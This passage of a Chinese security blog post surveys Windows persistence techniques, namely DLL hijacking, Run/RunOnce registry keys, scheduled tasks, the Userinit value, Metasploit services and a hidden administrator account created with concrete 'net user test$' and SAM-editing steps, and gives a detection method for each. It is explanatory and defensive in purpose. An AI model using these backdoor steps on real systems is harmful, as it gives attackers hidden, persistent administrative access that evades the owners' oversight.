+<p>桌面程序目前默认的DLL加载顺序为<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/DLLs/dynamic-link-library-search-order">Dynamic-link library search order - Win32 apps | Microsoft Learn</a></p>
+<h4 id="留后门-10"><a href="#留后门-10" class="headerlink" title="留后门"></a>留后门</h4><p>生成恶意的DLL文件，并且通过函数转发调用原始的DLL函数，完全不会影响应用程序的运行。可以选择劫持某应用程序特有的DLL，我们使用恶意 DLL 替换目标文件，然后再将原始 DLL 重命名并放置在应用程序同目录下(以便函数转发可以顺利进行)，当应用程序启动时就可以加载我们的恶意 DLL。当然也可以针对公共的DLL进行劫持，由于公共DLL可能被其他应用加载到内存，所以可能需要重启才能生效，具体DLL劫持可以参考<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/288943.html">dll 劫持和应用研究 - FreeBuf网络安全行业门户</a></p>
+<h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p>防御主要靠应用开发者对加载的DLL进行校验，从Windows 7的KB2533623补丁开始，微软更新了三个解决DLL劫持问题的新API：SetDefaultDllDirectories，AddDllDirectory，RemoveDllDirectory这几个API配合使用，可以有效的规避DLL劫持问题</p>
+<p>检查可以使用Process Monitor查看应用加载的DLL，分析导入导出DLL。使用自动化检测工具<a target="_blank" rel="noopener" href="https://github.com/sensepost/rattler">sensepost&#x2F;rattler: Automated DLL Enumerator (github.com)</a></p>
+<h3 id="注册表开机自启动项"><a href="#注册表开机自启动项" class="headerlink" title="注册表开机自启动项"></a>注册表开机自启动项</h3><p><code>MSF</code>的<code>Persistence</code>模块利用的就是写注册表自启动项来实现的，一般自启动项是这两个键：<code>Run</code>和<code>RunOnce</code>，两者的区别如下：</p>
+<ol>
+<li>Run：该项下的键值即为开机启动项，每一次随着开机而启动。</li>
+<li>RunOnce：RunOnce和Run差不多，唯一的区别就是RunOnce的键值只作用一次，执行完毕后就会自动删除</li>
+</ol>
+<p>常见注册表启动项键的位置：</p>
+<p>用户级</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce<br></code></pre></td></tr></table></figure>
+
+<p>系统级</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce<br>\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce<br></code></pre></td></tr></table></figure>
+
+<h4 id="留后门-11"><a href="#留后门-11" class="headerlink" title="留后门"></a>留后门</h4><p>在上述启动项位置新建字符串值，写入恶意的程序启动命令键值即可</p>
+<h4 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h4><p>检查以上注册表启动位置有没有可疑的启动项</p>
+<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p>windows下定时任务的命令有两个分别是：<code>at</code>和<code>schtasks</code>，他们两者主要区别是<code>at</code>命令在<code>win7</code>、<code>08</code>等高版本的windows中是不能将任务在前台执行的，也就是只会打开一个后台进程，而<code>schtasks</code>是将定时的任务在前台执行</p>
+<h4 id="留后门-12"><a href="#留后门-12" class="headerlink" title="留后门"></a>留后门</h4><p>AT命令（win10已经弃用）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">AT [\\computername] time [/INTERACTIVE]<br>    [ /EVERY:<span class="hljs-built_in">date</span>[,...] | /NEXT:<span class="hljs-built_in">date</span>[,...]] <span class="hljs-string">&quot;command&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>schtasks命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/s computer [/u [domain\]user /p password]] [/ru &#123;[Domain\]User | <span class="hljs-string">&quot;System&quot;</span>&#125; [/rp Password]] /?<br></code></pre></td></tr></table></figure>
+
+<h4 id="检测-2"><a href="#检测-2" class="headerlink" title="检测"></a>检测</h4><p>schtasks 命令可以查看所有计划任务，查看有没有可疑的计划任务</p>
+<h3 id="注册表用户登录初始化"><a href="#注册表用户登录初始化" class="headerlink" title="注册表用户登录初始化"></a>注册表用户登录初始化</h3><p><code>Userinit</code>的作用是用户在进行登陆初始化设置时，<code>WinLogon</code>进程会执行指定的<code>login scripts</code>，所以我们可以修改它的键值来添加我们要执行的程序</p>
+<h4 id="留后门-13"><a href="#留后门-13" class="headerlink" title="留后门"></a>留后门</h4><p><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code>注册表项中有个Userinit项，其中值为逗号分隔的启动项，我们可以在里面添加后门程序的启动</p>
+<h4 id="检测-3"><a href="#检测-3" class="headerlink" title="检测"></a>检测</h4><p>检查注册表Userinit是否有可疑的初始化项</p>
+<h3 id="自启动服务"><a href="#自启动服务" class="headerlink" title="自启动服务"></a>自启动服务</h3><p>自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务</p>
+<h4 id="留后门-14"><a href="#留后门-14" class="headerlink" title="留后门"></a>留后门</h4><p>可以使用metasploit框架注册一个服务，运行之后msf会在<code>%TMP%</code>目录下创建一个随机名称的文件夹，然后在该文件夹里面生成三个文件：<code>metsvc.dll</code>、<code>metsvc-server.exe</code>、<code>metsvc.exe</code></p>
+<h4 id="检测-4"><a href="#检测-4" class="headerlink" title="检测"></a>检测</h4><p>检查服务中有没有可疑的启动项，检查服务开放的端口</p>
+<h3 id="影子用户"><a href="#影子用户" class="headerlink" title="影子用户"></a>影子用户</h3><p>影子用户顾名思义就是一个隐藏用户，只能通过注册表查看这个用户，其它方式是找不到这个用户的信息的</p>
+<h4 id="留后门-15"><a href="#留后门-15" class="headerlink" title="留后门"></a>留后门</h4><ol>
+<li>在用户名后面加一个<code>$</code>可以创建一个匿名用户，创建完毕后我们再把这个用户添加到administrator组</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user <span class="hljs-built_in">test</span>$ 123456 /add<br>net localgroup administrators <span class="hljs-built_in">test</span>$ /add<br></code></pre></td></tr></table></figure>
+
+<p>这样我们就创建了一个隐藏账户并加入管理员组，密码为123456</p>
+<ol start="2">
+<li><p>打开注册表，定位到<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>（如果没有编辑权限可以先赋予当前用户administrator的具有完全控制和读取权限）</p>
+</li>
+<li><p>查看administrator对应的键值为1f4和隐藏账户test$的键值为3e9，然后在Users中找到对应数字的F值，将3e9的F值替换为1f4的F值，将00003e9和<code>test$</code>按顺序导出为1.reg和2.reg</p>
+</li>
+<li><p>然后删除用户，<code>net user test$ /del</code></p>
+</li>
+<li><p>按顺序导入刚才导出的注册表文件</p>
+</li>
+</ol>
+<h4 id="检测-5"><a href="#检测-5" class="headerlink" title="检测"></a>检测</h4><p>检查注册表项HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names用户是否与 lusrmgr.msc 中的用户是否一致</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/backdoor/">#backdoor</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Windows&amp;Linux后门技术初探</div>
+      <div>https://chujian521.github.io/blog/2023/09/23/Windows-Linux后门技术初探/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Encounter</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/blog/2023/09/16/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88memshell%EF%BC%89%E5%88%A9%E7%94%A8%E4%B8%8E%E6%A3%80%E6%B5%8B/" title="内存马（memshell）利用与检测">
+                        <span class="hidden-mobile">内存马（memshell）利用与检测</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="SOHUCS" sid='https://chujian521.github.io/blog/2023/09/23/Windows-Linux%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%88%9D%E6%8E%A2/'></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#SOHUCS', function() {
+      Fluid.utils.createScript("https://changyan.sohu.com/upload/changyan.js", function() {
+        window.changyan.api.config({"appid":"cywkrFUjM","appkey":"4ccd03889a49ffa3059780af8bbbc0e2"})
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+  <!--浏览器整蛊标题-->
+  <script type="text/javascript" src="\js\funnyTitle.js"></script>
+  <!--动态线条背景
+  <script type="text/javascript"
+    color="255,69,0" opacity='0.7' zIndex="-1" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+  </script>-->
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":300,"height":600},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
